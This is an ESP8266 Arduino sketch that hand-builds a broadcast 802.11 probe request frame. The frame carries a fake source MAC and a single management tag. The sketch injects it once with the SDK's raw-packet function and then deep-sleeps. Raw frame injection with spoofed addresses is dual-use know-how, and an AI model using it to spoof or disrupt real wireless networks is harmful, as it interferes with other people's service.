

#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

// ProbeRequest Packet buffer
uint8_t packet[26] = { 
        /*0*/   0x40, //Version (2bit), Type (2bit), Subtype(4bit)
        /*1*/   0x00, //Flags 
        /*2*/   0x00, 0x00, //Duration
        /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //destination MAC
        /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source MAC
        /*16*/  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //BSSID all ff is Broadcast
        /*22*/  0x00, 0x00, //Sequence Number (12bit), Fragment Number (4bit) [Hier endet probe request]
        /*24*/  0x83, //Tag Number (Path Reply 131) [Ab hier managemant tags]
        /*25*/  0x00, //Tag length
};            


void setup() { 
  wifi_send_pkt_freedom(packet, 26, 0);
  ESP.deepSleep(5 * 1000000);
}



void loop(){}

